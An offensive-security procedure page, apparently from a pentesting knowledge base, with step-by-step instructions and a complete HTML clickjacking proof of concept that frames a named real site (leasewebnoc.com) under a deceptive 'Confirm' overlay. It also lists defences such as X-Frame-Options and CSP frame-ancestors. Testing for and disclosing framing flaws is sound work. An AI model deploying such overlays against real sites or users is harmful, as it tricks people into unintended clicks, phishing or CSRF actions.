---
id: proc-clickjacking-poc-leaseweb
name: Create-and-Test-Clickjacking-Proof-of-Concept
tags:
  - clickjacking
  - x-frame-options
  - ui-redressing
  - poc
type: procedure
tools:
  - '[[tools/Notepad]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:05.329Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-and-Test-Clickjacking-Proof-of-Concept

## Summary

This procedure creates a simple HTML proof-of-concept (PoC) to demonstrate a clickjacking vulnerability on a target website, such as LeaseWeb's NOC site, by embedding it in an iframe without protection from the X-Frame-Options header. It allows attackers to overlay transparent elements to trick users into performing actions like clicking buttons or submitting forms, enabling phishing, data theft, or CSRF attacks.

## Description

Clickjacking, also known as UI redressing, exploits the lack of frame-busting headers like X-Frame-Options to embed a legitimate site in an iframe on a malicious page. Users are deceived into interacting with invisible or overlaid elements, potentially leading to unauthorized actions. This procedure targets web servers vulnerable to iframe embedding, confirmed by inspecting response headers (e.g., via browser dev tools or curl). Prerequisites include public access to the target URL and a local text editor. Expected outcomes: A testable PoC that loads the target without restrictions, simulating attack scenarios.

## Requirements

1. Access to a text editor like Notepad for HTML creation
2. Local web browser (e.g., Chrome, Firefox) for testing
3. Public HTTP access to the target site (e.g., http://leasewebnoc.com/)

## Defense

Defensive measures and detection strategies:

- Implement X-Frame-Options: DENY or SAMEORIGIN in server responses to prevent iframe embedding
- Use Content-Security-Policy (CSP) with frame-ancestors directive to restrict framing
- Monitor for anomalous iframe usage in web logs or via WAF rules detecting suspicious HTML patterns

## Objectives

1. Verify the target site's susceptibility to clickjacking by creating an embeddable PoC
2. Demonstrate potential for user deception leading to CSRF or phishing
3. Highlight the need for header-based protections

## Instructions

### Step 1: Create the HTML PoC File

**Context**: Use a text editor to write HTML that includes an iframe embedding the target site, with CSS for semi-transparency and absolute positioning to overlay clickable elements.

No specific command, but paste the following HTML code into the editor:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.5;
            z-index: 1;
        }
        .overlay {
            position: absolute;
            top: 100px;
            left: 100px;
            z-index: 2;
            background: red;
            color: white;
            padding: 10px;
        }
    </style>
</head>
<body>
    <iframe src="http://leasewebnoc.com/"></iframe>
    <div class="overlay">Click here to 'Confirm' action!</div>
    <script>
        window.onbeforeunload = function() {
            return "Are you sure?";
        };
    </script>
</body>
</html>
```

> This code embeds the target in a semi-transparent iframe and adds an overlay div to capture clicks, with a unload prompt to simulate engagement.

### Step 2: Save the File as HTML

**Context**: Save the content to make it executable as a web page in a browser.

In the text editor, save as 'clickjacking-poc.html' in a local directory.

> Ensures the file can be opened directly in a browser without server hosting.

### Step 3: Open and Test in Browser

**Context**: Load the PoC to confirm the vulnerability; the iframe should render without errors.

Open the .html file in a web browser.

> Browser loads the iframe; check console for no frame-ancestry violations. Interactions on overlays demonstrate the trickery potential.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Notepad]]

## Tags

- [[clickjacking]]
- [[x-frame-options]]
- [[ui-redressing]]
